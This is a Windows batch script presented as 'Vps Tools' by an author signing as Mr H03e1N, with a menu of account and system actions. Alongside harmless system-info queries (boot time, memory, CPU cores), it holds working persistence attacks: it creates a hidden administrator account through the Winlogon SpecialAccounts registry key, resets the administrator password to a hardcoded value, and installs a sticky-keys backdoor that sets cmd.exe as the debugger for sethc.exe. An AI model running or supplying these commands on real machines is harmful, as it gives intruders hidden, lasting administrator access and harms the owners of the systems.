echo off
color 0a
cls
:MENU
Echo.
ECHO. 
ECHO              ..................................................
ECHO. 
ECHO                             Vps Tools - Mr H03e1N 
ECHO.
ECHO                             Telegram : @MrH03e1N
ECHO.
ECHO                               Instagarm : Mrh03e1n
ECHO.                                   
ECHO              ..................................................
Echo.
ECHO.
ECHO  Please choose a number :
ECHO  1- Change Password
ECHO  2- Create Hidden User
ECHO  3- Set Password Default = Mr_H03e1N
ECHO  4- Create Backdoor
Echo  5- Delete Backdoor
Echo  6- Last Logon
Echo  7- Boot Time
Echo  8- Virtual Memory
Echo  9- Physical Memory (Ram)
eCHO 10- CPU Cores
ECHO. 
SET /P M=Choose a number then press ENTER:
IF %M%==1 GOTO ChangePass 
IF %M%==2 GOTO HiddenUser 
IF %M%==3 GOTO SetPass 
IF %M%==4 GOTO CreateBackdoor 
IF %M%==5 GOTO DeleteBackdoor 
IF %M%==6 GOTO Last Logon
IF %M%==7 GOTO Boot Time
IF %M%==8 GOTO Virtual Memory
IF %M%==9 GOTO Physical Memory (Ram)
IF %M%==10 GOTO CPU Cores

:ChangePass
cls
REM "@Mr_H03e1N  / Change Password"
REM ------------------------------
@echo off
set /p user=Please Enter Your Username:
set /p pass=Please Enter Desired Password:
net user %user% %pass%
GOTO MENU

:HiddenUser
cls
REM "Mr_H03e1N / Create Hidden User"
REM ------------------------------
@echo off
set /p user=Please Enter Desired Username:
set /p pass=Please Enter Desired Password:
net user /add %user% %pass%
net localgroup administrators /add %user%
reg add "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\Userlist" /v %user% /t REG_DWORD /d 0
GOTO MENU

:SetPass
cls
REM "Mr_H03e1N / Set Password Default"
REM ------------------------------
@echo off
net user administrator Hirad@123
GOTO MENU

:CreateBackdoor 
cls
REM "Mr_H03e1N / Create Backdoor"
REM ------------------------------
@echo off
REG ADD "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe" /v Debugger /t REG_SZ /d "C:\windows\system32\cmd.exe
GOTO MENU

:DeleteBackdoor
cls
REM "Mr_H03e1N / Delete Backdoor"
REM ------------------------------
@echo off
REG DELETE "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe"
GOTO MENU

:Last Logon
cls
REM "Mr_H03e1N / Last Logon"
REM ------------------------------
@echo off
net user Administrator | findstr /B /C:"Last logon"
GOTO MENU

:Boot Time
cls
REM "Mr_H03e1N / Delete Backdoor"
REM ------------------------------
@echo off
systeminfo | find "System Boot Time"
GOTO MENU

:Virtual Memory
cls
REM "Mr_H03e1N / Virtual Memory"
REM ------------------------------
@echo off
systeminfo | find "Virtual Memory"
GOTO MENU

:Physical Memory (Ram)
cls
REM "Mr_H03e1N / Total Physical Memory"
REM ------------------------------
@echo off
systeminfo | find "Total Physical Memory"
GOTO MENU

:CPU Cores
cls
REM "Mr_H03e1N / %NUMBER_OF_PROCESSORS%"
REM ------------------------------
@echo off
%NUMBER_OF_PROCESSORS%
GOTO MENU